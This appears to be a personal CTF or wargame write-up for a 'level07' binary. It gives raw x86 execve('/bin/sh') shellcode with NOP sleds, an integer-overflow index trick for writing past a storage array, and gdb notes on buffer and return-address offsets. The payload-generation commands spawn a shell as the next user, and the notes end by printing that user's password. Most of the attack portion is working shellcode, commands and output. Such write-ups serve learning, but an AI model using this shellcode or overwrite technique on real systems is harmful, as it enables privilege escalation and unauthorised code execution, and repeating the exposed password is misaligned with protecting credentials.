\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\x90

"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90"

1073741824 => 0 (en x 4 en 32 bits)
+1 pour le suivant => +3 pour le next ou on peut pas ecrire

python -c 'print "".join([("store\n2425393296\n" + str(n) + "\n") for n in range(1073741824, 1073741844)])', > /tmp/level07

(filling with nops)

now we split the shellcode in groups of 4 bytes and we reverse them for little indian

OR we just copy the carefully crafter payload in ressources using

<< eof cat > /tmp/level07

now we have setup the shellcode (can be done using (cat /tmp/level07))

stack starts at 0xfffdd000 and ends at 0xffffe000 (info proc all in gdb)

start of the buffer is at esp+36 (exp+0x24) = 0xffffd554

0xf7e45513 ? would mean 136020033 offset => input address 1073741824 + 136020033 = 1209761857 and input 0xffffd554 => \xff\xff\xd5\x54 => 1423310847


START OVER

gdb -> storage is at esp+24

=> i r esp => 0xffffdc00 => storage at 0xffffdc24 bunch of other things in gdb so this is not the exact address => we add a ton of nops and troubleshoot with kinda random values after this and end up working with 0xffffdc24 + 200 to shoot in nops

add the shellcode in the storage as before

to find EIP, we just see how much things are in the stack and try to find eip by hand, we end up finding the offset which is 114 after storage => 1073741824 + 114

put all that in ressources/script.py

run python /tmp/script.py > /tmp/input
cat /tmp/input - | env - ./level07

DONE

whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
